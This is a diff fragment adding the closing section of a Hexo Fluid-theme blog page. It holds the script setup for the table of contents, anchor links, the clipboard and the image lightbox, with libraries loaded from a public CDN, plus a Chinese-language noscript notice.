+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
